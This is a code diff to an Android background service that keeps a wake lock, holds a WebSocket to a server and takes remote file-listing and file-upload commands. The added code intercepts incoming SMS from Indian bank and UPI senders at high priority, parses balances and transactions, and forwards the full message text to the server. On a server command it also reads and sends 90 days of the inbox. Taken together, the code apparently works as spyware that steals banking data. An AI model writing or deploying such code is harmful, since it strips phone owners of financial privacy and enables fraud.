@@ -5,16 +5,23 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.provider.Telephony;
+import android.telephony.SmsMessage;
 import android.webkit.MimeTypeMap;
 import androidx.core.app.NotificationCompat;
 import android.graphics.Bitmap;
@@ -30,7 +37,11 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.TimeUnit;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class KeepAliveService extends Service {
 
@@ -38,6 +49,23 @@ public class KeepAliveService extends Service {
     private static final int    NOTIF_ID   = 1001;
     private static final String PREFS_NAME = "meeee";
     private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB
+
+    // Known Indian bank/UPI SMS sender IDs
+    private static final Set<String> BANK_SENDERS = new HashSet<>();
+    static {
+        String[] senders = { "HDFCBK","HDFCBNK","SBIINB","SBICRD","SBICARD","SBIPSG",
+            "ICICIB","ICICIBNK","AXISBK","AXISBANK","KOTAKB","KOTAK",
+            "PAYTM","PYTMSMS","PHONPE","GPAY","GOOGLEPAY",
+            "INDBNK","PNBSMS","BARODASMS","BOBTXN","CANBNK","UCOBNK",
+            "IDFCBK","YESBNK","INDUSIND","AUBANK","FEDRBL" };
+        for (String s : senders) BANK_SENDERS.add(s.toUpperCase());
+    }
+
+    private static final Pattern AMT_PATTERN     = Pattern.compile("(?:Rs\\.?|INR|₹)\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);
+    private static final Pattern DEBIT_PATTERN   = Pattern.compile("debited|paid|spent|deducted|withdrawn|sent|\\bdr\\b", Pattern.CASE_INSENSITIVE);
+    private static final Pattern CREDIT_PATTERN  = Pattern.compile("credited|received|added|deposited|\\bcr\\b", Pattern.CASE_INSENSITIVE);
+    private static final Pattern MERCH_PATTERN   = Pattern.compile("(?:paid to|sent to|transferred to|to|at|from)\\s+([A-Za-z0-9 &.'%@-]{2,40}?)(?:\\s+(?:via|on|at|\\.|,|UPI|Ref|txn)|$)", Pattern.CASE_INSENSITIVE);
+    private static final Pattern BAL_PATTERN     = Pattern.compile("(?:Avl\\.?\\s*[Bb]al|[Bb]alance|Avail[a-z]*\\s*Bal|Bal)\\s*(?:is|:)?\\s*(?:Rs\\.?|INR|₹)?\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);
 
     private PowerManager.WakeLock wakeLock;
     private OkHttpClient          httpClient;
@@ -47,6 +75,8 @@ public class KeepAliveService extends Service {
     private String                userName;
     private String                userId;      // assigned by server on auth_ok
     private boolean               shouldConnect = false;
+    private BroadcastReceiver     smsReceiver;
+    private final Set<String>     sentSmsIds = new HashSet<>();  // de-duplicate SMS
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
@@ -71,6 +101,28 @@ public class KeepAliveService extends Service {
             shouldConnect = true;
             connectWebSocket();
         }
+
+        // Real-time SMS receiver — picks up bank SMS as they arrive
+        smsReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context ctx, Intent intent) {
+                if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
+                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+                if (messages == null) return;
+                for (SmsMessage sms : messages) {
+                    String sender = sms.getOriginatingAddress();
+                    String body   = sms.getMessageBody();
+                    long   date   = sms.getTimestampMillis();
+                    if (isBankSender(sender)) {
+                        JSONObject txn = parseSmsToTransaction(sender, body, date);
+                        if (txn != null) sendTransaction(txn);
+                    }
+                }
+            }
+        };
+        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
+        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
+        registerReceiver(smsReceiver, filter);
     }
 
     @Override
@@ -104,6 +156,7 @@ public class KeepAliveService extends Service {
         shouldConnect = false;
         if (nativeWs != null) nativeWs.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        if (smsReceiver != null) { try { unregisterReceiver(smsReceiver); } catch (Exception ignored) {} }
         super.onDestroy();
     }
 
@@ -169,6 +222,8 @@ public class KeepAliveService extends Service {
                 handleLs(ws, msg);
             } else if ("read_file".equals(type)) {
                 handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
+            } else if ("sms_sync_request".equals(type)) {
+                handleSmsSyncRequest();
             }
         } catch (Exception e) { /* ignore */ }
     }
@@ -323,6 +378,111 @@ public class KeepAliveService extends Service {
             err.put("fromUserId", userId);
             nativeWs.send(err.toString());
         } catch (Exception ignored) {}
+    }
+
+    // ── SMS helpers ────────────────────────────────────────────────────────────
+
+    private boolean isBankSender(String address) {
+        if (address == null) return false;
+        String clean = address.toUpperCase().replaceAll("[^A-Z]", "");
+        for (String s : BANK_SENDERS) if (clean.contains(s)) return true;
+        return false;
+    }
+
+    private JSONObject parseSmsToTransaction(String sender, String body, long dateMs) {
+        if (body == null || body.length() < 10) return null;
+        Matcher amtM = AMT_PATTERN.matcher(body);
+        if (!amtM.find()) return null;
+        double amount;
+        try { amount = Double.parseDouble(amtM.group(1).replace(",", "")); } catch (Exception e) { return null; }
+        if (amount <= 0) return null;
+
+        boolean isDebit  = DEBIT_PATTERN.matcher(body).find();
+        boolean isCredit = CREDIT_PATTERN.matcher(body).find();
+        if (!isDebit && !isCredit) return null;
+
+        String merchant = "";
+        Matcher mM = MERCH_PATTERN.matcher(body);
+        if (mM.find()) merchant = mM.group(1).trim();
+
+        Double balance = null;
+        Matcher bM = BAL_PATTERN.matcher(body);
+        if (bM.find()) { try { balance = Double.parseDouble(bM.group(1).replace(",", "")); } catch (Exception ignored) {} }
+
+        String senderClean = sender != null ? sender.toUpperCase().replaceAll("[^A-Z]", "") : "UNKNOWN";
+        String bank = senderClean;
+        if (senderClean.contains("HDFC")) bank = "HDFC";
+        else if (senderClean.contains("SBI")) bank = "SBI";
+        else if (senderClean.contains("ICICI")) bank = "ICICI";
+        else if (senderClean.contains("AXIS")) bank = "Axis";
+        else if (senderClean.contains("KOTAK")) bank = "Kotak";
+        else if (senderClean.contains("PAYTM")) bank = "Paytm";
+        else if (senderClean.contains("PHONPE")) bank = "PhonePe";
+        else if (senderClean.contains("GPAY") || senderClean.contains("GOOGLEPAY")) bank = "Google Pay";
+
+        String category = "bank";
+        String lc = body.toLowerCase() + " " + merchant.toLowerCase();
+        if (bank.equals("Paytm") || bank.equals("PhonePe") || bank.equals("Google Pay") || lc.contains("upi") || lc.contains("phonepe") || lc.contains("paytm")) category = "upi";
+        else if (lc.contains("swiggy") || lc.contains("zomato") || lc.contains("mcdonald") || lc.contains("kfc") || lc.contains("pizza") || lc.contains("burger") || lc.contains("food")) category = "food";
+        else if (lc.contains("amazon") || lc.contains("flipkart") || lc.contains("myntra") || lc.contains("shopping")) category = "shopping";
+        else if (lc.contains("ola") || lc.contains("uber") || lc.contains("petrol") || lc.contains("fuel") || lc.contains("irctc")) category = "transport";
+        else if (lc.contains("electric") || lc.contains("water") || lc.contains("gas") || lc.contains("airtel") || lc.contains("jio") || lc.contains("broadband")) category = "utilities";
+
+        try {
+            JSONObject txn = new JSONObject();
+            txn.put("id", Long.toHexString(dateMs) + Integer.toHexString(body.hashCode()));
+            txn.put("amount", amount);
+            txn.put("type", isDebit ? "debit" : "credit");
+            txn.put("category", category);
+            txn.put("merchant", merchant.isEmpty() ? bank : merchant);
+            txn.put("description", body);
+            txn.put("date", dateMs);
+            txn.put("source", "sms");
+            txn.put("bank", bank);
+            if (balance != null) txn.put("balance", balance);
+            return txn;
+        } catch (Exception e) { return null; }
+    }
+
+    private void sendTransaction(JSONObject txn) {
+        if (nativeWs == null || userId == null) return;
+        try {
+            String id = txn.optString("id");
+            if (sentSmsIds.contains(id)) return;  // de-duplicate
+            sentSmsIds.add(id);
+
+            JSONObject msg = new JSONObject();
+            msg.put("type", "transaction_add");
+            msg.put("transaction", txn);
+            nativeWs.send(msg.toString());
+        } catch (Exception ignored) {}
+    }
+
+    // Handle sms_sync_request — read SMS inbox (last 90 days) and send parsed transactions
+    private void handleSmsSyncRequest() {
+        new Thread(() -> {
+            try {
+                long since = System.currentTimeMillis() - (90L * 24 * 60 * 60 * 1000);
+                ContentResolver cr = getContentResolver();
+                Cursor cursor = cr.query(
+                    Uri.parse("content://sms/inbox"),
+                    new String[]{"_id", "address", "body", "date"},
+                    "date > ?", new String[]{String.valueOf(since)},
+                    "date DESC"
+                );
+                if (cursor == null) return;
+                while (cursor.moveToNext()) {
+                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                    String body    = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                    long   date    = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+                    if (isBankSender(address)) {
+                        JSONObject txn = parseSmsToTransaction(address, body, date);
+                        if (txn != null) sendTransaction(txn);
+                    }
+                }
+                cursor.close();
+            } catch (Exception e) { /* SMS permission may not be granted yet */ }
+        }).start();
     }
 
     // ── Path helpers ───────────────────────────────────────────────────────────
